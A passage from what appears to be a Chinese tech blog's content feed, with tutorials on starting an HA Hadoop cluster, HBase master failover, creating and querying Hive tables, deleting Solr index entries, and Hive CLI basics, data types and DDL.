</span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!-- 指定nodemanager启动时加载server的方式为shuffle server --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span>  </span><br><span class="line">       <span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>slaves,datanode配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hadoop03</span><br><span class="line">hadoop04</span><br><span class="line">hadoop05</span><br></pre></td></tr></table></figure>
<blockquote>
<h1 id="3-2-启动"><a href="#3-2-启动" class="headerlink" title="3.2 启动"></a>3.2 启动</h1><h4 id="3-2-1-启动journalnode"><a href="#3-2-1-启动journalnode" class="headerlink" title="3.2.1 启动journalnode"></a>3.2.1 启动journalnode</h4></blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">##在slave中配置的对应主机中启动journalnode</span></span><br><span class="line">/opt/hadoop/hadoop-2.7.4/sbin/hadoop-daemon.sh start journalnode</span><br></pre></td></tr></table></figure>
<p>jps查看进程，出现journalnode表示成功。</p>
<p><img src="https://i.imgur.com/oeZXNm9.png" alt></p>
<blockquote>
<h4 id="3-2-2-格式化namemode"><a href="#3-2-2-格式化namemode" class="headerlink" title="3.2.2 格式化namemode"></a>3.2.2 格式化namemode</h4></blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 所有设置juonulnode机器上启动journalnode</span></span><br><span class="line">hadoop-daemon.sh start journalnode</span><br><span class="line"></span><br><span class="line"><span class="comment">#在主节点上执行</span></span><br><span class="line">hdfs namenode -format</span><br><span class="line"></span><br><span class="line"><span class="comment"># 格式化成功后,主节点启动namenode</span></span><br><span class="line">hadoop-daemon.sh start namenode</span><br><span class="line"></span><br><span class="line"><span class="comment">#在备用namenode主机上执行</span></span><br><span class="line">hdfs namenode -bootstrapStandby</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备用namenode启动</span></span><br><span class="line">hadoop-daemon.sh start namenode</span><br><span class="line"></span><br><span class="line"><span class="comment">#namenode主机上格式化zk,否则HA失效</span></span><br><span class="line">hdfs zkfc -formatZK</span><br></pre></td></tr></table></figure>
<blockquote>
<h4 id="3-2-3-启动-dfs、yarn"><a href="#3-2-3-启动-dfs、yarn" class="headerlink" title="3.2.3 启动 dfs、yarn"></a>3.2.3 启动 dfs、yarn</h4></blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#启动dfs</span></span><br><span class="line">/opt/hadoop/hadoop-2.7.4/sbin/start-dfs.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动yarn</span></span><br><span class="line">/opt/hadoop/hadoop-2.7.4/sbin/start-yarn.sh</span><br></pre></td></tr></table></figure>
<p>正常启动的进程信息:</p>
<p>namenode:</p>
<p><img src="https://i.imgur.com/Ze96fHf.png" alt></p>
<p>datanode:</p>
<p><img src="https://i.imgur.com/XVNnn1L.png" alt></p>
<p>可以查看web界面情况,访问 hadoop01:50070</p>
<p><img src="https://i.imgur.com/HkPl9mm.png" alt></p>
<blockquote>
<p>如果没有正常启动,很可能是配置错误,查看日志排错.</p>
</blockquote>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>Hbase backup-master自动切换</title>
    <url>/2019/04/02/%E5%A4%A7%E6%95%B0%E6%8D%AE/Hbase%20backup-master%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2/</url>
    <content><![CDATA[<p>启动 hbase 的时候,进入 shell 界面,<br><img src="/2019/04/02/大数据/Hbase backup-master自动切换/hbase_20190402194614.png" alt></p>
<a id="more"></a>
<p>hbase master 自动切换失败.</p>
<p>hbase-site.xml 增加配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.unsafe.stream.capability.enforce<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>分发到各个节点，重启 hbase 集群.<br>查看 zk 中 master 节点的信息<br><img src="/2019/04/02/大数据/Hbase backup-master自动切换/hbase_20190402200922.png" alt><br>此时，hadoop01 就是 master。</p>
<p>在 hadoop01 节点上执行命令,停止 hbase master 节点:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@hadoop01 hbase-2.1.4]<span class="comment"># /opt/bigdata/hbase-2.1.4/bin/hbase-daemon.sh stop master</span></span><br><span class="line">running master, logging to /opt/bigdata/hbase-2.1.4/logs/hbase-root-master-hadoop01.out</span><br><span class="line">stopping master.</span><br></pre></td></tr></table></figure>
<p>查看 zk 中 master 节点的信息:</p>
<p><img src="/2019/04/02/大数据/Hbase backup-master自动切换/hbase_20190402201209.png" alt><br>此时,备用 master 成为 active 状态,zk 中记录为 hadoop02。</p>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>hbase</tag>
      </tags>
  </entry>
  <entry>
    <title>Hive查询</title>
    <url>/2018/01/17/%E5%A4%A7%E6%95%B0%E6%8D%AE/Hive%E6%9F%A5%E8%AF%A2/</url>
    <content><![CDATA[<p>这一节主要介绍Hive的查询。</p>
<h1 id="构造数据"><a href="#构造数据" class="headerlink" title="构造数据"></a>构造数据</h1><p>准备电影数据300M.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">--切换默认存储位置的数据库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="keyword">test</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--创建标签表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> tags (tagId <span class="built_in">bigint</span>,tag <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'tag name'</span>) <span class="keyword">comment</span> <span class="string">'tags of movie'</span></span><br><span class="line"><span class="keyword">ROW</span> <span class="keyword">FORMAT</span> SERDE <span class="string">'org.apache.hadoop.hive.serde2.OpenCSVSerde'</span> <span class="keyword">WITH</span> SERDEPROPERTIES (<span class="string">"separatorChar"</span> = <span class="string">","</span>)  <span class="keyword">STORED</span> <span class="keyword">AS</span> TEXTFILE;</span><br><span class="line"></span><br><span class="line"><span class="comment">--导入标签信息</span></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/opt/open/ml-latest/genome-tags.csv'</span> <span class="keyword">into</span> <span class="keyword">table</span> tags;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--创建电影表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> movies (movieId <span class="built_in">bigint</span>,title <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'movie name'</span>,</span><br><span class="line">genres <span class="built_in">Array</span>&lt;<span class="keyword">string</span>&gt; <span class="keyword">COMMENT</span> <span class="string">'The kinds of Movie'</span>)</span><br><span class="line"> <span class="keyword">COMMENT</span> <span class="string">'movies'</span></span><br><span class="line"><span class="keyword">ROW</span> <span class="keyword">FORMAT</span> SERDE <span class="string">'org.apache.hadoop.hive.serde2.OpenCSVSerde'</span></span><br><span class="line"><span class="keyword">WITH</span> SERDEPROPERTIES (<span class="string">"separatorChar"</span> = <span class="string">","</span>,<span class="string">"colelction.delim"</span>=<span class="string">"|"</span>)  <span class="keyword">STORED</span> <span class="keyword">AS</span> TEXTFILE;</span><br><span class="line"></span><br><span class="line"><span class="comment">--导入数据</span></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/opt/open/ml-latest/movies.csv'</span> <span class="keyword">into</span> <span class="keyword">table</span> movies;</span><br><span class="line"></span><br><span class="line"><span class="comment">--用户评价</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> user_rating (userId <span class="built_in">bigint</span>,movieId <span class="built_in">bigint</span>,</span><br><span class="line">rating <span class="built_in">decimal</span>(<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">comment</span> <span class="string">'movie rate'</span>,</span><br><span class="line">rate_time <span class="built_in">TIMESTAMP</span> )</span><br><span class="line"> <span class="keyword">COMMENT</span> <span class="string">'user rate'</span></span><br><span class="line"><span class="keyword">ROW</span> <span class="keyword">FORMAT</span> SERDE <span class="string">'org.apache.hadoop.hive.serde2.OpenCSVSerde'</span></span><br><span class="line"><span class="keyword">WITH</span> SERDEPROPERTIES (<span class="string">"separatorChar"</span> = <span class="string">","</span>)  <span class="keyword">STORED</span> <span class="keyword">AS</span> TEXTFILE;</span><br><span class="line"></span><br><span class="line"><span class="comment">--导入数据</span></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/opt/open/ml-latest/ratings.csv'</span> <span class="keyword">into</span> <span class="keyword">table</span> user_rating;</span><br><span class="line"></span><br><span class="line"><span class="comment">--用户电影标签信息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> user_movie_tag </span><br><span class="line">(userId <span class="built_in">bigint</span>,movieId <span class="built_in">bigint</span>,tag <span class="keyword">string</span> <span class="keyword">comment</span> <span class="string">'movie rate'</span>,</span><br><span class="line">user_movie_time <span class="built_in">TIMESTAMP</span> )</span><br><span class="line"> <span class="keyword">COMMENT</span> <span class="string">'user movie tag '</span></span><br><span class="line"><span class="keyword">ROW</span> <span class="keyword">FORMAT</span> SERDE <span class="string">'org.apache.hadoop.hive.serde2.OpenCSVSerde'</span></span><br><span class="line"><span class="keyword">WITH</span> SERDEPROPERTIES (<span class="string">"separatorChar"</span> = <span class="string">","</span>)  <span class="keyword">STORED</span> <span class="keyword">AS</span> TEXTFILE;</span><br><span class="line"></span><br><span class="line"><span class="comment">--导入数据</span></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/opt/open/ml-latest/tags.csv'</span> <span class="keyword">into</span> <span class="keyword">table</span> user_movie_tag;</span><br></pre></td></tr></table></figure>
<p>开搞</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">---查看电影总数、唯一的电影数量</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(<span class="number">1</span>) <span class="keyword">from</span> movies;</span><br><span class="line"></span><br><span class="line"><span class="comment">--join </span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> movies m <span class="keyword">join</span> user_rating u <span class="keyword">on</span> (m.movieid=u.movieid);</span><br></pre></td></tr></table></figure>
<p>未完,待续…</p>
<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><blockquote>
<ul>
<li><a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+Select" target="_blank" rel="noopener">LanguageManual Select</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>hive</tag>
      </tags>
  </entry>
  <entry>
    <title>Solr删除索引信息</title>
    <url>/2018/03/19/%E5%A4%A7%E6%95%B0%E6%8D%AE/Solr%E5%88%A0%E9%99%A4%E7%B4%A2%E5%BC%95%E4%BF%A1%E6%81%AF/</url>
    <content><![CDATA[<p>在solr管理页面document视图下操作,切记 commit。操作面板选择信息:</p>
<p>Request-Handler (qt) /update</p>
<p>Document Type  XML</p>
<p>1.清空索引库</p>
<p>commit 不能少,否则不会提交.</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">delete</span>&gt;</span><span class="tag">&lt;<span class="name">query</span>&gt;</span>*:*<span class="tag">&lt;/<span class="name">query</span>&gt;</span><span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">commit</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>2.根据指定属性删除索引</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">delete</span>&gt;</span><span class="tag">&lt;<span class="name">query</span>&gt;</span>key:value<span class="tag">&lt;/<span class="name">query</span>&gt;</span><span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">commit</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">delete</span>&gt;</span><span class="tag">&lt;<span class="name">id</span>&gt;</span>1<span class="tag">&lt;/<span class="name">id</span>&gt;</span><span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">commit</span>/&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>solr</tag>
      </tags>
  </entry>
  <entry>
    <title>Hive基础学习</title>
    <url>/2018/01/15/%E5%A4%A7%E6%95%B0%E6%8D%AE/Hive%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>hive是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，并提供简单的sql查询功能，可以将sql语句转换为MapReduce任务进行运行。 其优点是学习成本低，可以通过类SQL语句快速实现简单的MapReduce统计，不必开发专门的MapReduce应用,十分适合数据仓库的统计分析。</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>安装不做介绍,主要依赖Hadoop环境。参考官网配置安装即可。此处以Hive-2.3.0来展开。<br>主要是格式化元数据,执行 schematool -dbType mysql -initSchema 即可。</p>
<h1 id="命令行界面"><a href="#命令行界面" class="headerlink" title="命令行界面"></a>命令行界面</h1><p>hive命令行界面选项</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ./hive --<span class="built_in">help</span> --service cli</span></span><br><span class="line">usage: hive</span><br><span class="line"> -d,--define &lt;key=value&gt;          Variable substitution to apply to Hive</span><br><span class="line">                                  commands. e.g. -d A=B or --define A=B</span><br><span class="line">    --database &lt;databasename&gt;     Specify the database to use</span><br><span class="line"> -e &lt;quoted-query-string&gt;         SQL from command line</span><br><span class="line"> -f &lt;filename&gt;                    SQL from files</span><br><span class="line"> -H,--help                        Print help information</span><br><span class="line">    --hiveconf &lt;property=value&gt;   Use value for given property</span><br><span class="line">    --hivevar &lt;key=value&gt;         Variable substitution to apply to Hive</span><br><span class="line">                                  commands. e.g. --hivevar A=B</span><br><span class="line"> -i &lt;filename&gt;                    Initialization SQL file</span><br><span class="line"> -S,--silent                      Silent mode in interactive shell</span><br><span class="line"> -v,--verbose                     Verbose mode (echo executed SQL to the</span><br><span class="line">                                  console)</span><br></pre></td></tr></table></figure>
<p>进入命令行界面,从Hive0.14开始beetline作为新的命令行界面(稍后介绍)。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ./hive --service cli</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> &gt;hive <span class="built_in">set</span>;</span></span><br><span class="line">hive.optimize.skewjoin=false</span><br><span class="line">hive.optimize.skewjoin.compiletime=false</span><br><span class="line">hive.optimize.sort.dynamic.partition=false</span><br><span class="line">hive.optimize.union.remove=false</span><br><span class="line">hive.orc.cache.stripe.details.mem.size=256Mb</span><br><span class="line">hive.orc.cache.use.soft.references=false</span><br><span class="line">hive.orc.compute.splits.num.threads=10</span><br><span class="line">hive.orc.splits.allow.synthetic.fileid=true</span><br><span class="line">hive.orc.splits.directory.batch.ms=0</span><br><span class="line">hive.orc.splits.include.file.footer=false</span><br><span class="line">hive.orc.splits.include.fileid=true</span><br><span class="line">hive.orc.splits.ms.footer.cache.enabled=false</span><br><span class="line">hive.orc.splits.ms.footer.cache.ppd.enabled=true</span><br><span class="line">hive.order.columnalignment=true</span><br><span class="line">hive.orderby.position.alias=true</span><br><span class="line">hive.parquet.timestamp.skip.conversion=true</span><br><span class="line">hive.ppd.recognizetransivity=true</span><br><span class="line">hive.ppd.remove.duplicatefilters=true</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> &gt;hive <span class="built_in">set</span> -v;</span></span><br><span class="line"></span><br><span class="line">env:HADOOP_PID_DIR=</span><br><span class="line">env:HADOOP_PORTMAP_OPTS=-Xmx512m </span><br><span class="line">env:HADOOP_PREFIX=/opt/hadoop/hadoop-2.7.4</span><br><span class="line">env:HADOOP_SECONDARYNAMENODE_OPTS=-Dhadoop.security.logger=INFO,RFAS -Dhdfs.audit.logger=INFO,NullAppender </span><br><span class="line">env:HADOOP_SECURE_DN_LOG_DIR=/</span><br><span class="line">env:HADOOP_SECURE_DN_PID_DIR=</span><br><span class="line">env:HADOOP_SECURE_DN_USER=</span><br><span class="line">env:HADOOP_USER_CLASSPATH_FIRST=true</span><br><span class="line">env:HADOOP_YARN_HOME=/opt/hadoop/hadoop-2.7.4</span><br><span class="line">env:HBASE_HOME=/opt/hadoop/hbase-1.3.1</span><br><span class="line">env:HISTCONTROL=ignoredups</span><br><span class="line">env:HISTSIZE=1000</span><br><span class="line">env:HIVE_AUX_JARS_PATH=/opt/hadoop/hive-2.3.0/lib</span><br><span class="line">env:HIVE_CONF_DIR=/opt/hadoop/hive-2.3.0/conf</span><br><span class="line">env:HIVE_HOME=/opt/hadoop/hive-2.3.0</span><br><span class="line">env:HOME=/root</span><br><span class="line">env:HOSTNAME=hadoop01</span><br><span class="line">env:JAVA_HOME=/usr/java/jdk1.8.0_144</span><br><span class="line">env:KAFKA_HOME=/opt/hadoop/kafka_2.12-0.11.0.1</span><br><span class="line">env:KYLIN_HOME=/opt/hadoop/kylin-2.2.0</span><br><span class="line">env:LANG=en_US.UTF-8</span><br><span class="line">env:LD_LIBRARY_PATH=:/opt/hadoop/hadoop-2.7.4/lib/native</span><br><span class="line">env:LESSOPEN=||/usr/bin/lesspipe.sh %s</span><br><span class="line">env:LOGNAME=root</span><br><span class="line"></span><br><span class="line">system:java.class.version=52.0</span><br><span class="line">system:java.endorsed.dirs=/usr/java/jdk1.8.0_144/jre/lib/endorsed</span><br><span class="line">system:java.ext.dirs=/usr/java/jdk1.8.0_144/jre/lib/ext:/usr/java/packages/lib/ext</span><br><span class="line">system:java.home=/usr/java/jdk1.8.0_144/jre</span><br><span class="line">system:java.io.tmpdir=/tmp</span><br><span class="line">system:java.library.path=/opt/hadoop/hadoop-2.7.4/lib/native</span><br><span class="line">system:java.net.preferIPv4Stack=true</span><br><span class="line">system:java.runtime.name=Java(TM) SE Runtime Environment</span><br><span class="line">system:java.runtime.version=1.8.0_144-b01</span><br><span class="line">system:java.specification.name=Java Platform API Specification</span><br><span class="line">system:java.specification.vendor=Oracle Corporation</span><br><span class="line">system:java.specification.version=1.8</span><br><span class="line">system:java.util.logging.config.file=/opt/hadoop/hive-2.3.0/conf/parquet-logging.properties</span><br><span class="line">system:java.vendor=Oracle Corporation</span><br><span class="line">system:java.vendor.url=http://java.oracle.com/</span><br><span class="line">system:java.vendor.url.bug=http://bugreport.sun.com/bugreport/</span><br><span class="line">system:java.version=1.8.0_144</span><br><span class="line">system:java.vm.info=mixed mode</span><br><span class="line">system:java.vm.name=Java HotSpot(TM) 64-Bit Server VM</span><br><span class="line">system:java.vm.specification.name=Java Virtual Machine Specification</span><br><span class="line">system:java.vm.specification.vendor=Oracle Corporation</span><br><span class="line">system:java.vm.specification.version=1.8</span><br><span class="line">system:java.vm.vendor=Oracle Corporation</span><br><span class="line">system:java.vm.version=25.144-b01</span><br><span class="line">system:line.separator=</span><br><span class="line">system:log4j.configurationFile=hive-log4j2.properties</span><br><span class="line">system:os.arch=amd64</span><br><span class="line">system:os.name=Linux</span><br><span class="line">system:os.version=2.6.32-696.el6.x86_64</span><br><span class="line">system:path.separator=:</span><br><span class="line">system:proc_hivecli=</span><br></pre></td></tr></table></figure>
<p>set 命令会打印命名空间hivevar,hivecong,sytem和env中的所有变量。加上-v,会打印Hadoop中定义的所有属性,例如控制HDFS和MapReduce。</p>
<p>还可以查看指定变量的值.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> &gt;hive <span class="built_in">set</span> env:HOME;</span></span><br><span class="line">env:HOME=/root</span><br><span class="line"><span class="meta">#</span><span class="bash"> &gt;hive <span class="built_in">set</span> system:os.version;</span></span><br><span class="line">system:os.version=2.6.32-696.el6.x86_64</span><br></pre></td></tr></table></figure>
<p>自定义变量—define key=value。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ./hive -define username=LAOWANG;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> hive&gt; <span class="built_in">set</span> username;</span></span><br><span class="line">username=LAOWANG</span><br></pre></td></tr></table></figure>
<h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><blockquote>
<ul>
<li>基本数据类型</li>
</ul>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">数据类型</th>
<th style="text-align:center">长度</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">TINYINT</td>
<td style="text-align:center">1Byte</td>
<td style="text-align:center">-128 到 127</td>
</tr>
<tr>
<td style="text-align:center">SMALLINT</td>
<td style="text-align:center">2Byte</td>
<td style="text-align:center">-32,768 到 32,767</td>
</tr>
<tr>
<td style="text-align:center">INT/INTEGER</td>
<td style="text-align:center">4Byte</td>
<td style="text-align:center">-2,147,483,648 到 2,147,483,647</td>
</tr>
<tr>
<td style="text-align:center">BIGINT</td>
<td style="text-align:center">8Byte</td>
<td style="text-align:center">-9,223,372,036,854,775,808 到 9,223,372,036,854,775,807</td>
</tr>
<tr>
<td style="text-align:center">FLOAT</td>
<td style="text-align:center">4Byte</td>
<td style="text-align:center">单精度浮点数</td>
</tr>
<tr>
<td style="text-align:center">DOUBLE</td>
<td style="text-align:center">8Byte</td>
<td style="text-align:center">双精度浮点数</td>
</tr>
<tr>
<td style="text-align:center">DOUBLE PRECISION (v2.2.0+)</td>
<td style="text-align:center">8Byte</td>
<td style="text-align:center">DOUBLE的别名</td>
</tr>
<tr>
<td style="text-align:center">DECIMAL (v0.11.0)</td>
<td style="text-align:center"></td>
<td style="text-align:center">0.11.0有38个精度的数字,0.13.0开始用户可自定义精度</td>
</tr>
<tr>
<td style="text-align:center">NUMERIC(v3.0.0+)</td>
<td style="text-align:center"></td>
<td style="text-align:center">和DECIMAL一样</td>
</tr>
<tr>
<td style="text-align:center">BOOLEAN</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">BINARY(v0.8.0+)</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<ul>
<li>日期类型</li>
</ul>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">数据类型</th>
<th style="text-align:center">长度</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">TIMESTAMP (v0.8.0+)</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">DATE  (v0.12.0+)</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">INTERVAL (v1.2.0+)</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<ul>
<li>字符串</li>
</ul>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">数据类型</th>
<th style="text-align:center">长度</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">STRING (v0.12.0+)</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">CHAR  (v0.13.0+)</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">VARCHAR (v0.12.0+)</td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<ul>
<li>复合类型</li>
</ul>
</blockquote>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">数据类型</th>
<th style="text-align:center">长度</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">arrays (v0.14+)</td>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">maps  (v0.14+)</td>
<td style="text-align:center"></td>
<td style="text-align:center">MAP<primitive_type, data_type></primitive_type,></td>
</tr>
<tr>
<td style="text-align:center">structs (v0.12.0+)</td>
<td style="text-align:center"></td>
<td style="text-align:center">STRUCT<col_name : data_type [comment col_comment], ...></col_name></td>
</tr>
<tr>
<td style="text-align:center">union  (v0.7.0+)</td>
<td style="text-align:center"></td>
<td style="text-align:center">UNIONTYPE<data_type, data_type, ...></data_type,></td>
</tr>
</tbody>
</table>
</div>
<h1 id="Hive-DDL"><a href="#Hive-DDL" class="headerlink" title="Hive DDL"></a>Hive DDL</h1><h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><blockquote>
<ul>
<li>查看数据库</li>
</ul>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#查看所有的数据库</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> hive&gt; show databases;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#查看模糊匹配的数据库</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> hive&gt; show databases like <span class="string">'t.*'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#打印当前的数据库</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">hive&gt; <span class="built_in">set</span> hive.cli.print.current.db=<span class="literal">true</span>;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">切换数据库</span></span><br><span class="line"><span class="meta">#</span><span class="bash">hive (default)&gt; use test1;</span></span><br><span class="line">OK</span><br><span class="line">Time taken: 0.097 seconds</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#显示当前的数据库</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">hive (test1)&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>创建数据库</li>
</ul>
</blockquote>
<p>语法:</p>
<p>CREATE (DATABASE|SCHEMA) [IF NOT EXISTS] database_name<br>  [COMMENT database_comment]<br>  [LOCATION hdfs_path]<br>  [WITH DBPROPERTIES (property_name=property_value, …)];</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#创建数据库</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">&gt;hive  create database IF NOT EXISTS <span class="built_in">test</span> comment  <span class="string">'test database'</span> ;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#location指定db文件的位置,默认hive.metastore.warehouse.dir配置的路径.</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">hive&gt; create database IF NOT EXISTS test2 comment <span class="string">'test database'</span> location <span class="string">'/hive/tests/test.db'</span> ;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>修改数据库</li>
</ul>
</blockquote>
<p>语法:</p>
<p>ALTER (DATABASE|SCHEMA) database_name SET DBPROPERTIES (property_name=property_value, …);   — ( 0.14.0以后可用)</p>
<p>ALTER (DATABASE|SCHEMA) database_name SET OWNER [USER|ROLE] user_or_role;<br> — (0.13.0 以后可用; SCHEMA added in Hive 0.14.0)</p>
<p>ALTER (DATABASE|SCHEMA) database_name SET LOCATION hdfs_path;<br> — (2.2.1, 2.4.0 以后可用)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看建库语句</span></span><br><span class="line"><span class="meta">#</span><span class="bash">hive&gt; describe schema test1;</span></span><br><span class="line">OK</span><br><span class="line">test1	test database	hdfs://hn1/hive/tests	root	USER	</span><br><span class="line">Time taken: 0.043 seconds, Fetched: 1 row(s)</span><br><span class="line"><span class="meta">#</span><span class="bash">hive&gt; describe database test1;</span></span><br><span class="line">OK</span><br><span class="line">test1	test database	hdfs://hn1/hive/tests	root	USER	</span><br><span class="line">Time taken: 0.044 seconds, Fetched: 1 row(s)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">修改数据库</span></span><br><span class="line"><span class="meta">#</span><span class="bash">&gt;hive alter schema test1 <span class="built_in">set</span> dbproperties (<span class="string">'create_by'</span>=<span class="string">'xwolf'</span>,<span 